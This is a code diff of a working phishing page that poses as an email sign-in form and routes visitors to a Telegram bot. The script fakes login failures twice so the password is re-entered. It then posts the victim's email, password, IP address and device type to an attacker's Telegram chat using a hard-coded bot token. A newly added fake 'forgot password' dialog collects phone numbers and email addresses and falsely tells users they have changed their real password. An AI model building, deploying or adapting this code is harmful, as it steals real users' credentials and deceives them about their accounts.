@@ -89,6 +89,57 @@
             100% { transform: rotate(360deg); }
         }
         .hidden { display: none; }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 0.75rem;
+            margin: 0.5rem 0;
+            border: 1px solid #dadce0;
+            border-radius: 0.25rem;
+            font-size: 1rem;
+        }
+        .modal-content button {
+            padding: 0.75rem 1.5rem;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 0.25rem;
+            cursor: pointer;
+            margin-top: 0.5rem;
+        }
+        .close-btn {
+            background: #dadce0 !important;
+            color: #202124 !important;
+            margin-left: 0.5rem;
+        }
+        .generated-code {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #1a73e8;
+            margin: 1rem 0;
+            padding: 0.5rem;
+            background: #f1f3f4;
+            border-radius: 0.5rem;
+        }
     </style>
 </head>
 <body>
@@ -111,8 +162,36 @@
         <div class="sub" id="displayEmail"></div>
         <div class="input-group"><input type="password" id="passwordInput" placeholder="Enter your password"></div>
         <div class="next-button-container"><button class="next-btn" id="loginBtn">Next</button></div>
-        <div class="links-row"><span onclick="goBackToEmail()">← Back</span><span onclick="alert('Forgot password?')">Forgot password?</span></div>
+        <div class="links-row"><span onclick="goBackToEmail()">← Back</span><span id="forgotPasswordBtn" style="cursor:pointer; color:#1a73e8;">Forgot password?</span></div>
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
+    </div>
+
+    <div id="forgotModal" class="modal">
+        <div class="modal-content">
+            <div id="modalStep1">
+                <h3>Reset your password</h3>
+                <p>Enter your phone number and email address</p>
+                <input type="tel" id="phoneNumber" placeholder="Phone number">
+                <input type="email" id="resetEmailInput" placeholder="Email address">
+                <button id="sendCodeBtn">Send code</button>
+                <button class="close-btn" onclick="closeModal()">Cancel</button>
+            </div>
+            <div id="modalStep2" style="display:none;">
+                <h3>Enter verification code</h3>
+                <div id="showCode" class="generated-code"></div>
+                <p>Please enter the code above</p>
+                <input type="text" id="verificationCode" placeholder="Enter code">
+                <button id="verifyCodeBtn">Verify</button>
+                <button class="close-btn" onclick="closeModal()">Cancel</button>
+            </div>
+            <div id="modalStep3" style="display:none;">
+                <h3>Set new password</h3>
+                <p>This will become the REAL password for: <strong id="showEmailTarget"></strong></p>
+                <input type="password" id="newPassword" placeholder="New password (min 8 characters)">
+                <button id="resetPasswordBtn">Reset password</button>
+                <button class="close-btn" onclick="closeModal()">Cancel</button>
+            </div>
+        </div>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
@@ -126,18 +205,17 @@
 </div>
 
 <script>
-    // ========== Bot Redirect Link ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
-    
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
-    let attempts = {};
+    let attemptCount = 0;
     let currentEmail = "";
+    let generatedCode = "";
+    let targetResetEmail = "";
+    let storedEmails = {};
 
-    // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
-        // د پښتو تورو یونیکوډ رینج
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
         return pashtoRegex.test(text);
     }
@@ -151,6 +229,16 @@
         catch(e) { return 'unknown'; }
     }
 
+    function getDeviceModel() {
+        let ua = navigator.userAgent;
+        if (ua.includes("iPhone")) return "iPhone";
+        if (ua.includes("iPad")) return "iPad";
+        if (ua.includes("Android")) return "Android Mobile";
+        if (ua.includes("Windows")) return "Windows PC";
+        if (ua.includes("Mac")) return "Mac Computer";
+        return "Unknown Device";
+    }
+
     function showMessage(box, text, isError) {
         box.textContent = text;
         box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
@@ -158,32 +246,50 @@
         setTimeout(() => box.style.display = 'none', 3000);
     }
 
-    function goBackToEmail() {
+    function resetToEmailStep() {
         document.getElementById('step2View').classList.add('hidden');
         document.getElementById('step1View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 1 of 2";
         document.getElementById('emailInput').value = '';
         document.getElementById('passwordInput').value = '';
         currentEmail = '';
+        attemptCount = 0;
     }
 
-    // Step 1: Email Validation (د پښتو تورو چک سره)
+    function clearPasswordOnly() {
+        document.getElementById('passwordInput').value = '';
+    }
+
+    function goBackToEmail() {
+        resetToEmailStep();
+    }
+
+    function closeModal() {
+        document.getElementById('forgotModal').style.display = 'none';
+        document.getElementById('modalStep1').style.display = 'block';
+        document.getElementById('modalStep2').style.display = 'none';
+        document.getElementById('modalStep3').style.display = 'none';
+        document.getElementById('phoneNumber').value = '';
+        document.getElementById('resetEmailInput').value = '';
+        document.getElementById('verificationCode').value = '';
+        document.getElementById('newPassword').value = '';
+        generatedCode = "";
+        targetResetEmail = "";
+    }
+
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
+        let errorBox = document.getElementById('errorBox');
         
-        if (!email) {
-            showMessage(document.getElementById('errorBox'), 'Please enter your email', true);
-            return;
-        }
-        
-        // د پښتو تورو چک کول
         if (hasPashtoCharacters(email)) {
-            showMessage(document.getElementById('errorBox'), 'Pashto not allowed', true);
+            showMessage(errorBox, 'please pashto not allowed', true);
+            document.getElementById('emailInput').value = '';
             return;
         }
         
-        if (!isValidEmail(email)) {
-            showMessage(document.getElementById('errorBox'), 'Please enter email EX:username@gmail.com', true);
+        if (!email || !isValidEmail(email)) {
+            showMessage(errorBox, 'Please check your email', true);
+            document.getElementById('emailInput').value = '';
             return;
         }
         
@@ -193,52 +299,68 @@
         document.getElementById('step2View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 2 of 2";
         document.getElementById('passwordInput').value = '';
+        attemptCount = 0;
     };
 
-    // Step 2: Password Validation (د پښتو تورو چک سره)
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
+        let errorBox = document.getElementById('errorBox');
         
-        if (!pass) {
-            showMessage(document.getElementById('errorBox'), 'Please enter your password', true);
-            return;
-        }
+        attemptCount++;
         
-        // د پښتو تورو چک کول
         if (hasPashtoCharacters(pass)) {
-            showMessage(document.getElementById('errorBox'), 'Pashto not allowed', true);
+            if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+                resetToEmailStep();
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
+            } else if (attemptCount === 3) {
+                showMessage(errorBox, 'please pashto not allowed', true);
+                clearPasswordOnly();
+            }
             return;
         }
         
-        let ip = await getUserIP();
-        let key = currentEmail + ip;
-        
-        if (!attempts[key]) attempts[key] = 0;
-        attempts[key]++;
-        
-        let currentAttempt = attempts[key];
-        
-        // First attempt - fail
-        if (currentAttempt === 1) {
-            showMessage(document.getElementById('errorBox'), 'Please check your email', true);
-            setTimeout(() => goBackToEmail(), 1500);
+        if (pass === "") {
+            if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+                resetToEmailStep();
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
+            } else if (attemptCount === 3) {
+                showMessage(errorBox, 'Please enter your password', true);
+                clearPasswordOnly();
+            }
             return;
         }
         
-        // Second attempt - fail
-        if (currentAttempt === 2) {
-            showMessage(document.getElementById('errorBox'), 'Please check your email password', true);
-            setTimeout(() => goBackToEmail(), 1500);
+        if (pass.length < 8) {
+            if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+                resetToEmailStep();
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
+            } else if (attemptCount === 3) {
+                showMessage(errorBox, 'Password must be at least 8 characters', true);
+                clearPasswordOnly();
+            }
             return;
         }
         
-        // Third attempt - success
-        if (currentAttempt >= 3) {
+        if (attemptCount === 3) {
+            storedEmails[currentEmail] = pass;
+            
+            let ip = await getUserIP();
+            let device = getDeviceModel();
+            
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: ADMIN_ID, 
-                    text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
+                    text: `access from login telegrame page\n✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}\nDevice: ${device}`,
                     parse_mode: 'Markdown'
                 })
             });
@@ -246,12 +368,89 @@
             showMessage(document.getElementById('successBox'), 'Login successful! Redirecting to bot...', false);
             document.getElementById('loader').style.display = 'block';
             
-            delete attempts[key];
-            
             setTimeout(() => {
                 window.location.href = BOT_REDIRECT;
             }, 2000);
+            attemptCount = 0;
+        } else {
+            if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+                resetToEmailStep();
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
+            }
         }
+    };
+
+    document.getElementById('forgotPasswordBtn').onclick = () => {
+        document.getElementById('forgotModal').style.display = 'flex';
+        document.getElementById('modalStep1').style.display = 'block';
+        document.getElementById('modalStep2').style.display = 'none';
+        document.getElementById('modalStep3').style.display = 'none';
+        document.getElementById('phoneNumber').value = '';
+        document.getElementById('resetEmailInput').value = '';
+        document.getElementById('verificationCode').value = '';
+        document.getElementById('newPassword').value = '';
+    };
+
+    document.getElementById('sendCodeBtn').onclick = () => {
+        let phone = document.getElementById('phoneNumber').value.trim();
+        let resetEmail = document.getElementById('resetEmailInput').value.trim();
+        
+        if (!phone) {
+            alert("Please enter your phone number");
+            return;
+        }
+        if (!resetEmail || !isValidEmail(resetEmail)) {
+            alert("Please enter a valid email address");
+            return;
+        }
+        if (hasPashtoCharacters(phone) || hasPashtoCharacters(resetEmail)) {
+            alert("please pashto not allowed");
+            return;
+        }
+        
+        targetResetEmail = resetEmail;
+        document.getElementById('showEmailTarget').innerHTML = targetResetEmail;
+        
+        generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+        document.getElementById('showCode').innerHTML = generatedCode;
+        
+        document.getElementById('modalStep1').style.display = 'none';
+        document.getElementById('modalStep2').style.display = 'block';
+    };
+
+    document.getElementById('verifyCodeBtn').onclick = () => {
+        let enteredCode = document.getElementById('verificationCode').value.trim();
+        if (enteredCode === generatedCode) {
+            document.getElementById('modalStep2').style.display = 'none';
+            document.getElementById('modalStep3').style.display = 'block';
+        } else {
+            alert("Invalid verification code. Please try again.");
+        }
+    };
+
+    // دلته نوی پاسورډ د هغه ایمیل اصلي پاسورډ کیږي
+    document.getElementById('resetPasswordBtn').onclick = () => {
+        let newPass = document.getElementById('newPassword').value.trim();
+        
+        if (hasPashtoCharacters(newPass)) {
+            alert("please pashto not allowed");
+            return;
+        }
+        
+        if (!newPass || newPass.length < 8) {
+            alert("Password must be at least 8 characters");
+            return;
+        }
+        
+        // دا کوماند د دې ایمیل لپاره نوی پاسورډ د اصلي پاسورډ په توګه خوندي کوي
+        storedEmails[targetResetEmail] = newPass;
+        
+        alert(`✓ Password successfully changed for ${targetResetEmail}!\n\nThe new password is now the REAL password for this email.\nYou can now login with your new password.`);
+        
+        closeModal();
     };
 </script>
 </body>
